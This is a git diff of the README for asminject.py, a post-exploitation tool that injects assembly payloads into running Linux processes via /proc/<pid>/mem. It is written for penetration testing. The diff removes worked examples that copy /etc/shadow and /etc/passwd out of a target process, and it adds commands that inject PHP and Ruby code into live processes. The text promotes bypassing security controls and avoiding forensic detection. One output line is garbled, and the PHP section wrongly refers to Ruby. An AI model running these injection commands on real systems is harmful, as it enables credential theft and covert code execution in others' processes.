@@ -1,7 +1,7 @@
 # asminject.py
 *asminject.py* is a heavily-modified fork of [David Buchanan's dlinject project](https://github.com/DavidBuchanan314/dlinject). Injects arbitrary assembly (or precompiled binary) payloads directly into Linux processes without the use of ptrace by accessing /proc/&lt;pid>/mem. Useful for certain post-exploitation scenarios, recovering content from process memory when ptrace is not available, and bypassing some security controls. Can inject into containerized processes from outside of the container, as long as you have root access on the host.
 
-This is a very early, alpha-quality version of this utility. v0.8 is very broken, because it is in the process of a significant rewrite.
+This is a very early, alpha-quality version of this utility.
 
 * [Origins](#origins)
 * [Setup](#setup)
@@ -65,55 +65,12 @@ If you are injecting code into a containerized process from outside the containe
 This code requires no relative offset information, because it's all done using Linux syscalls. It may also help avoid some methods of forensic detection versus using the *cp*, *cat*, or other commands.
 
 ```
-# python3 ./asminject.py 1544016 asm/x86-64/copy_file_using_syscalls.s --var sourcefile "/etc/shadow" --var destfile "/tmp/shadow_copied_using_syscalls.txt" --stop-method "slow" --pause false --stage-mode mem
-
-                     .__            __               __
-  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-        \/                   \/\______|    \/     \/     \/|__|   \/
-
-asminject.py
-v0.3
-Ben Lincoln, Bishop Fox, 2021-08-30
-https://github.com/BishopFox/asminject
-based on dlinject, which is Copyright (c) 2019 David Buchanan
-dlinject source: https://github.com/DavidBuchanan314/dlinject
-
-...omitted for brevity...
-[*] Waiting for stage 1
-[*] RSP is 0x00007ffdd7d1bba8
-[*] Value at RSP is 0x0000000000000000
-[*] MMAP'd block is 0x00007f44f259c000
-[*] Writing stage 2 to 0x00007f44f259c000 in target memory
-[*] Writing 0x01 to 0x00007ffdd7d1bba8 in target memory to indicate OK
-[*] Stage 2 proceeding
-[*] Returning to normal time...
-[*] Setting process priority for asminject.py (PID: 1544030) to 0
-[*] Setting process priority for target process (PID: 1544016) to 0
-[*] Setting CPU affinity for target process (PID: 1544016) to [0, 1]
-[+] Done!
-                                                                                                                                                     
-# ls -al /tmp
-
-...omitted for brevity...
--rwxr-xr-x  1 root       root        1766 Aug 31 11:56 shadow_copied_using_syscalls.txt
-...omitted for brevity...
-                                                                                                                                                     
-# cat /tmp/shadow_copied_using_syscalls.txt 
-
-root:!:18704:0:99999:7:::
-daemon:*:18704:0:99999:7:::
-bin:*:18704:0:99999:7:::
-sys:*:18704:0:99999:7:::
-sync:*:18704:0:99999:7:::
-...omitted for brevity...
+# python3 ./asminject.py 1876385 asm/x86-64/copy_file_using_syscalls.s --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt"
 ```
 
 ### Execute arbitrary Python code inside an existing Python process
 
-Launch a harmless Python process that simulates one with access to super-secret, sensitive data. Note the use of *python2* specifically. For *python3* target  processes, you'll most likely need to use the *--non-pic-binary* option discussed later in this document.
+Launch a harmless Python process that simulates one with access to super-secret, sensitive data. Note the use of *python2* specifically. For *python3* target processes, you'll most likely need to use the *--non-pic-binary* option discussed later in this document.
 
 ```
 $ sudo python2 ./calling_script.py
@@ -159,6 +116,16 @@ bin:*:18704:0:99999:7:::
 sys:*:18704:0:99999:7:::
 ```
 
+### Execute arbitrary PHP code inside an existing PHP process
+
+PHP has a similar "compile and execute this sequence of Ruby source code" method:
+
+```
+# readelf -a --wide /usr/bin/php8.1 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-copyroom-php8.1-2022-05-10-01.txt
+
+# python3 ./asminject.py 1876385 asm/x86-64/execute_php_code.s --relative-offsets relative_offsets-copyroom-php8.1-2022-05-10-01.txt  --stop-method "slow" --var phpcode "echo \\\"Injected PHP code\\\n\\\";" --var phpname PHP
+```
+
 ### Execute arbitrary Ruby code inside an existing Ruby process
 
 Ruby has a similar "compile and execute this sequence of Ruby source code" method. The current code for it in *asminject.py* has a few limitations, but it does work:
@@ -167,43 +134,9 @@ Ruby has a similar "compile and execute this sequence of Ruby source code" metho
 * The targeted process will lock up after the injected code finishes executing
 
 ```
-# python3 ./asminject.py 1639664 /asm/x86-64/execute_ruby_code.s --relative-offsets relative_offsets-copyroom-libruby-2.7.so.2.7.3-2021-09-01.txt --var rubycode "File.binwrite('/home/user/copied_using_ruby.txt', data = File.binread('/etc/passwd'))" --var rubyargv "/usr/bin/ruby" --stop-method "slow" --pause false --stage-mode mem
+# readelf -a --wide /usr/lib/x86_64-linux-gnu/libruby-2.7.so.2.7.4 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-copyroom-libruby-2.7.4-2022-05-10-01.txt
 
-...omitted for brevity...
-[*] Wrote first stage shellcode at 00007fcf9ab0149b in target process 1639664
-[*] Using '/usr/lib/x86_64-linux-gnu/libruby-2.7.so.2.7.3' for regex placeholder '.+/libruby[0-9\.so\-]+$' in assembly code
-[*] Writing assembled binary to /tmp/tmp7wxbeztc.o
-[*] RSP is 0x00007ffe8da03670
-[*] Value at RSP is 0x00007ffe8da03690
-[*] MMAP'd block is 0x00005598bbaa9228
-[*] Waiting for stage 1
-[*] RSP is 0x00007ffe8da03670
-[*] Value at RSP is 0x00007ffe8da03690
-[*] MMAP'd block is 0x00005598bbaa9228
-[*] Waiting for stage 1
-[*] RSP is 0x00007ffe8da035d0
-[*] Value at RSP is 0x0000000000000000
-[*] MMAP'd block is 0x00007fcf9af40000
-[*] Writing stage 2 to 0x00007fcf9af40000 in target memory
-[*] Writing 0x01 to 0x00007ffe8da035d0 in target memory to indicate OK
-[*] Stage 2 proceeding
-[*] Returning to normal time...
-[*] Setting process priority for asminject.py (PID: 1639670) to 0
-[*] Setting process priority for target process (PID: 1639664) to 0
-[*] Setting CPU affinity for target process (PID: 1639664) to [0, 1]
-[+] Done!
-                                                                                                                                                     
-
-# ls -al /home/user/copied_using_ruby.txt 
--rw-r--r-- 1 user user 3472 Sep  1 18:01 /home/user/copied_using_ruby.txt
-
-# cat /home/user/copied_using_ruby.txt 
-root:x:0:0:root:/root:/usr/bin/zsh
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-...omitted for brevity...
+# python3 ./asminject.py 1876194 asm/x86-64/execute_ruby_code.s --relative-offsets relative_offsets-copyroom-libruby-2.7.4-2022-05-10-01.txt  --stop-method "slow" --var rubycode "puts(\\\"Injected Ruby code\\\")"
 ```
 
 
@@ -287,32 +220,7 @@ Meterpreter  : x64/linux
 If you don't mind making library calls, writing custom code is much easier. This example uses code that (like the first example) creates a copy of a file, but by using libc's fopen(), fread(), fwrite(), and fclose() instead of syscalls, can easily use a buffered approach that's more efficient.
 
 ```
-# python3 ./asminject.py 1544597 asm/x86-64/copy_file_using_libc.s --var sourcefile "/etc/passwd" --var destfile "/tmp/copied_using_libc.txt" --stop-method "slow" --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --pause false --stage-mode mem
-
-...omitted for brevity...
-[*] RSP is 0x00007ffd39d25208
-[*] Value at RSP is 0x00005568364980b4
-[*] MMAP'd block is 0x00000001368bd209
-[*] Wrote first stage shellcode at 00007f1f121331c6 in target process 1544597
-[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.[0-9]+.so$' in assembly code
-[*] Writing assembled binary to /tmp/tmp0zvbe4b3.o
-[*] RSP is 0x00007ffd39d25168
-[*] Value at RSP is 0x0000000000000000
-[*] MMAP'd block is 0x00007f1f12279000
-[*] Writing stage 2 to 0x00007f1f12279000 in target memory
-[*] Writing 0x01 to 0x00007ffd39d25168 in target memory to indicate OK
-[*] Stage 2 proceeding
-...omitted for brevity...
-[+] Done!
-
-# cat /tmp/copied_using_libc.txt
-
-root:x:0:0:root:/root:/usr/bin/zsh
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-...omitted for brevity...
+# python3 ./asminject.py 1876570 asm/x86-64/copy_file_using_libc.s --relative-offsets relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.33.so-2022-05-05.txt --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt" --debug
 ```
 
 
@@ -370,56 +278,6 @@ As the message indicates, this type of binary can be manually flagged using one 
 [*] Handling '/usr/bin/python3.9' as non-PIC binary
 [*] /usr/bin/python3.9: 0x0000000000000000
 ...omitted for brevity...
-[+] Done!
-
-```
-
-### Using memory-only staging
-
-*asminject.py* currently defaults to a file-based second stage (based on the one in *dlinject.py*), but supports memory-only staging as well:
-
-```
-# python3 ./asminject.py 1472534 asm/x86-64/execute_python_code-01.s --relative-offsets relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false --stage-mode mem
-
-...omitted for brevity...
-[*] Writing assembled binary to /tmp/tmprdbl1tj9.o
-[*] RSP is 0x00007ffd409c1278
-[*] Value at RSP is 0x00007f89ea2d489a
-[*] MMAP'd block is 0x00007f89e9dc8b14
-[*] Wrote first stage shellcode at 00007f89ea341e8e in target  [rpcess ,e,pru
-[*] Using '/usr/lib/x86_64-linux-gnu/libc-2.31.so' for regex placeholder '.+/libc-2.31.so$' in assembly code
-[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
-[*] Writing assembled binary to /tmp/tmpqft8zspj.o
-[*] RSP is 0x00007ffd409c1278
-[*] Value at RSP is 0x00007f89ea2d489a
-[*] MMAP'd block is 0x00007f89e9dc8b14
-[*] Waiting for stage 1
-[*] RSP is 0x00007ffd409c1278
-[*] Value at RSP is 0x00007f89ea2d489a
-[*] MMAP'd block is 0x00007f89e9dc8b14
-[*] Waiting for stage 1
-[*] RSP is 0x00007ffd409c1278
-[*] Value at RSP is 0x00007f89ea2d489a
-[*] MMAP'd block is 0x00007f89e9dc8b14
-[*] Waiting for stage 1
-[*] RSP is 0x00007ffd409c1278
-[*] Value at RSP is 0x00007f89ea2d489a
-[*] MMAP'd block is 0x00007f89e9dc8b14
-[*] Waiting for stage 1
-[*] Couldn't retrieve current syscall values
-[*] Waiting for stage 1
-[*] Couldn't retrieve current syscall values
-[*] Waiting for stage 1
-[*] RSP is 0x00007ffd409c11d8
-[*] Value at RSP is 0x0000000000000000
-[*] MMAP'd block is 0x00007f89ea5c4000
-[*] Writing stage 2 to 0x00007f89ea5c4000 in target memory
-[*] Writing 0x01 to 0x00007ffd409c11d8 in target memory to indicate OK
-[*] Stage 2 proceeding
-[*] Returning to normal time...
-[*] Setting process priority for asminject.py (PID: 1472539) to 0
-[*] Setting process priority for target process (PID: 1472534) to 0
-[*] Setting CPU affinity for target process (PID: 1472534) to [0, 1]
 [+] Done!
 
 ```
@@ -504,6 +362,14 @@ Currently, only one example shellcode file is provided (copy files using syscall
 If you are an authorized administrator of a Linux system where someone has accidentally set */proc/sys/kernel/yama/ptrace_scope* to 3, or are conducting an authorized penetration test of an environment where that value has been set, see the <a href="ptrace_scope_kernel_module/">ptrace_scope_kernel_module directory</a>.
 
 ## Version history
+
+### 0.10 (2022-05-10)
+
+* Python and Ruby injection are working again for x86-64
+* PHP injection works now for x86-64
+* Copy files using only syscalls and copy files using libc calls are working again for x86-64
+* Most of the rearchitecture is complete
+* ARM32 code has not been updated yet
 
 ### 0.8 (2022-05-06)
 
